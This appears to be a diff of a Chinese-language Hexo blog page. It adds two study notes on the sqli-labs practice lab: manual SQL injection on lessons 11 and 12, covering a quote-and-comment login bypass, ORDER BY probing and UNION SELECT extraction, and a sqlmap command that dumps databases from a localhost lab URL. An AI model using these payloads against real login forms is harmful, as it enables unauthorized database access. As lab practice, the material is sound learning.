@@ -64,6 +64,92 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-11" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/01/24/page-11/" class="article-date">
+  <time datetime="2021-01-24T09:35:33.000Z" itemprop="datePublished">2021-01-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/24/page-11/">page十一关手动注入 十二也可以</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>先判断注入类型 </p>
+<p>用火狐下载个插件hackbar </p>
+<p>然后 post data那边输入 uname=admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd=admin&amp;submit=Submit （十二关是双引号 就加上“））</p>
+<p>这关的就有提示单引号注入 那么uname=admin’ #&amp;passwd=admin&amp;submit=Submit 输入这段</p>
+<p>登陆成功  然后uname=admin’  order by 2（这个数字可以慢慢试看到多少的时候显示登陆错误）#&amp;passwd=admin&amp;submit=Submit 这个是用来的出显示位数的</p>
+<p>接下来使用联合查询语句 union select 来进行爆破，使用union select的时候要注意，输入的unname必须是一个不存在的，，否则将会输出不出来</p>
+<p>uname=aaa’ union select 1,2#&amp;passwd=admin&amp;submit=Submit 比如这样子</p>
+<p>uname=aaa’ union select user(),version() #&amp;passwd=admin&amp;submit=Submit这句爆出使用者和数据库版本</p>
+<p>之后操作就和第一关是一样的都是那些语句</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/24/page-11/" data-id="ckkay6gmn0000p0v78d5dgon8" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-page-9" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/01/22/page-9/" class="article-date">
+  <time datetime="2021-01-22T12:27:10.000Z" itemprop="datePublished">2021-01-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/22/page-9/">sqlmap抓包功能</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>a老样子 win+r cmd sqlmap.py -u “想抓哪关的包的地址例如：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs/Less-11/&quot;">http://localhost/sqli-labs/Less-11/&quot;</a> –forms  –thread 10 -dbs  </p>
+<p>这个会出现一句话例如这样Edit POST data [default: uname=&amp;passwd=&amp;submit=Submit] (Warning: blank fields detected):</p>
+<p>按照上面的要求就在后面输入 uname=aaa（随便）&amp;passwd=aaa（随便）&amp;submit=Submit</p>
+<p>也可选择默认方式后面加个–batch</p>
+<p>这速度也挺快的</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/22/page-9/" data-id="ckk89f7cc0000g0v78fw7hsus" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-page-8" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/01/20/page-8/" class="article-date">
@@ -621,189 +707,11 @@ echo "Have a good night!";
 
 
   
-    <article id="post-page" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/18/page/" class="article-date">
-  <time datetime="2020-10-18T13:00:12.000Z" itemprop="datePublished">2020-10-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/18/page/">page11</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>HTML5 添加了很多语义元素如下所示：</p>
-<table>
-<thead>
-<tr>
-<th align="left">标签</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><article></td>
-<td align="left">定义页面独立的内容区域。</td>
-</tr>
-<tr>
-<td align="left"><aside></td>
-<td align="left">定义页面的侧边栏内容。</td>
-</tr>
-<tr>
-<td align="left"><bdi></td>
-<td align="left">允许您设置一段文本，使其脱离其父元素的文本方向设置。</td>
-</tr>
-<tr>
-<td align="left"><command></td>
-<td align="left">定义命令按钮，比如单选按钮、复选框或按钮</td>
-</tr>
-<tr>
-<td align="left"><details></td>
-<td align="left">用于描述文档或文档某个部分的细节</td>
-</tr>
-<tr>
-<td align="left"><dialog></td>
-<td align="left">定义对话框，比如提示框</td>
-</tr>
-<tr>
-<td align="left"><summary></td>
-<td align="left">标签包含 details 元素的标题</td>
-</tr>
-<tr>
-<td align="left"><figure></td>
-<td align="left">规定独立的流内容（图像、图表、照片、代码等等）。</td>
-</tr>
-<tr>
-<td align="left"><figcaption></td>
-<td align="left">定义 <figure> 元素的标题</td>
-</tr>
-<tr>
-<td align="left"><footer></td>
-<td align="left">定义 section 或 document 的页脚。</td>
-</tr>
-<tr>
-<td align="left"><header></td>
-<td align="left">定义了文档的头部区域</td>
-</tr>
-<tr>
-<td align="left"><mark></td>
-<td align="left">定义带有记号的文本。</td>
-</tr>
-<tr>
-<td align="left"><meter></td>
-<td align="left">定义度量衡。仅用于已知最大和最小值的度量。</td>
-</tr>
-<tr>
-<td align="left"><nav></td>
-<td align="left">定义导航链接的部分。</td>
-</tr>
-<tr>
-<td align="left"><progress></td>
-<td align="left">定义任何类型的任务的进度。</td>
-</tr>
-<tr>
-<td align="left"><ruby></td>
-<td align="left">定义 ruby 注释（中文注音或字符）。</td>
-</tr>
-<tr>
-<td align="left"><rt></td>
-<td align="left">定义字符（中文注音或字符）的解释或发音。</td>
-</tr>
-<tr>
-<td align="left"><rp></td>
-<td align="left">在 ruby 注释中使用，定义不支持 ruby 元素的浏览器所显示的内容。</td>
-</tr>
-<tr>
-<td align="left"><section></td>
-<td align="left">定义文档中的节（section、区段）。</td>
-</tr>
-<tr>
-<td align="left"><time></td>
-<td align="left">定义日期或时间。</td>
-</tr>
-<tr>
-<td align="left"><wbr></td>
-<td align="left">规定在文本中的何处适合添加换行符。s</td>
-</tr>
-</tbody></table>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/18/page/" data-id="ckgf4d7cw00007ov7bz4qd9wi" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/18/hello-world/" class="article-date">
-  <time datetime="2020-10-18T04:40:52.464Z" itemprop="datePublished">2020-10-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/18/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/18/hello-world/" data-id="ckgemnqxx0000tcv7c0vc3ijj" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -835,7 +743,15 @@ echo "Have a good night!";
       <ul>
         
           <li>
-            <a href="/2021/02/07/page-23/">sqlilabs 29</a>
+            <a href="/2021/02/08/page-25/">sqlilabs 34 35</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/08/page-24/">sqlilabs 32 33</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/07/page-23/">sqlilabs 29 30 31</a>
           </li>
         
           <li>
@@ -844,14 +760,6 @@ echo "Have a good night!";
         
           <li>
             <a href="/2021/02/05/page-20/">sqlilabs 26</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/01/page-19/">sqlilabs 25 25a</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/01/page-17/">sqli-labs less 24</a>
           </li>
         
       </ul>
